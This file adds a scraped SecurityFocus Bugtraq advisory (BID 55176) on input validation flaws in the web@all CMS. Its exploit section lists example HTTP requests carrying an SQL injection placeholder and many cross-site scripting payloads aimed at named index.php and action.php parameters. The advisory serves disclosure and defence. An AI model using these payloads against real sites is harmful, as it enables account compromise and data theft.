@@ -1,0 +1,93 @@
+#SpeeDr00t@Black Falcon<br>#bid55176<p><b><span style="font-size: 18pt;">web@all Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/55176/info">info</a><br><a href="http://www.securityfocus.com/bid/55176/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/55176/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/55176/solution">solution</a><br><a href="http://www.securityfocus.com/bid/55176/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				55176
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 23 2012 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Aug 23 2012 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				LiquidWorm
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues through a browser.                <br/> <br/>The following example requests are available:         <br/> <br/>http://www.example.com/webatall/sys/index.php?_key=author&amp;amp;_order=1SQL ATTACK QUERY&amp;amp;_textstatus=-1&amp;amp;_type=0&amp;amp;mod=article <br/> <br/>POST /webatall/sys/action.php HTTP/1.1 <br/>act=1%3cdiv%20style%3dwidth%3aexpression%28prompt%28900164%29%29%3e&amp;amp;goto=%2fsys&amp;amp;mod=member&amp;amp;password=Password&amp;amp;security=1&amp;amp;submit=Sign%20in&amp;amp;username=Username <br/> <br/>POST /webatall/sys/action.php HTTP/1.1 <br/>act=signin&amp;amp;goto=%2fsys&amp;amp;mod=1%3cdiv%20style%3dwidth%3aexpression%28prompt%28920000%29%29%3e&amp;amp;password=Password&amp;amp;security=1&amp;amp;submit=Sign%20in&amp;amp;username=Username <br/> <br/>POST /webatall/sys/action.php HTTP/1.1 <br/>act=signin&amp;amp;goto=%2fsys&amp;amp;mod=member&amp;amp;password=Password&amp;amp;security=1%3cdiv%20style%3dwidth%3aexpression%28prompt%28964492%29%29%3e&amp;amp;submit=Sign%20in&amp;amp;username=Username <br/> <br/>POST /webatall/sys/action.php HTTP/1.1 <br/>act=signin&amp;amp;goto=%2fsys&amp;amp;mod=member&amp;amp;password=admin&amp;amp;security=1&amp;amp;submit=Sign+in&amp;amp;username=1%3cdiv%20style%3dwidth%3aexpression%28prompt%28913398%29%29%3e <br/> <br/>GET /webatall/sys/index.php?_flag=&amp;amp;_key=title&amp;amp;_order=&amp;amp;_text%5b%5d=&amp;amp;_text%5bcategory%5d=&amp;amp;_text%5bstatus%5d=-1&amp;amp;_type%5b%5d=0&amp;amp;id=%22%20onmouseover%3dprompt%28940245%29%20bad%3d%22&amp;amp;mod=article <br/> <br/>GET /webatall/sys/index.php?_texttimeadd=1345564800&amp;amp;_typetimeadd=2&amp;amp;mod=1%3cdiv%20style%3dwidth%3aexpression%28prompt%28961358%29%29%3e <br/> <br/>GET /webatall/sys/index.php?_flag=%22%20onmouseover%3dprompt%28916116%29%20bad%3d%22&amp;amp;_key=title&amp;amp;_order=&amp;amp;_text%5b%5d=&amp;amp;_text%5bcategory%5d=&amp;amp;_text%5bstatus%5d=-1&amp;amp;_type%5b%5d=0&amp;amp;id=&amp;amp;mod=article <br/> <br/>GET /webatall/sys/index.php?_flag=&amp;amp;_key=title&amp;amp;_order=&amp;amp;_text%5b%5d=%22%20onmouseover%3dprompt%28965775%29%20bad%3d%22&amp;amp;_text%5bcategory%5d=&amp;amp;_text%5bstatus%5d=-1&amp;amp;_type%5b%5d=0&amp;amp;id=&amp;amp;mod=article <br/> <br/>GET /webatall/sys/index.php?_text%5balias%5d=%22%20onmouseover%3dprompt%28989568%29%20bad%3d%22&amp;amp;_type%5balias%5d=0&amp;amp;mod=article <br/> <br/>GET /webatall/sys/index.php?_flag=&amp;amp;_key=title&amp;amp;_order=&amp;amp;_text%5b%5d=&amp;amp;_text%5bcategory%5d=%22%20onmouseover%3dprompt%28926119%29%20bad%3d%22&amp;amp;_text%5bstatus%5d=-1&amp;amp;_type%5b%5d=0&amp;amp;id=&amp;amp;mod=article <br/> <br/>GET /webatall/sys/index.php?_text%5bemail%5d=%22%20onmouseover%3dprompt%28999602%29%20bad%3d%22&amp;amp;_type%5bemail%5d=0&amp;amp;mod=member <br/> <br/>GET /webatall/sys/index.php?_text%5btitle%5d=%22%20onmouseover%3dprompt%28927731%29%20bad%3d%22&amp;amp;_type%5btitle%5d=0&amp;amp;mod=article <br/> <br/>GET /webatall/sys/index.php?_text%5busername%5d=%22%20onmouseover%3dprompt%28926119%29%20bad%3d%22&amp;amp;_type%5busername%5d=0&amp;amp;mod=member <br/> <br/>GET /webatall/sys/index.php?_texttimeadd=%22%20onmouseover%3dprompt%28929079%29%20bad%3d%22&amp;amp;_typetimeadd=2&amp;amp;mod=member <br/> <br/>POST http://localhost/webatall/sys/action.php HTTP/1.1 <br/>title  "&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt; <br/> <br/>POST http://localhost/webatall/sys/action.php HTTP/1.1 <br/>description  "&amp;gt;&amp;lt;script&amp;gt;alert(2);&amp;lt;/script&amp;gt;
+	
+		<ul>
+</ul>
+</div>
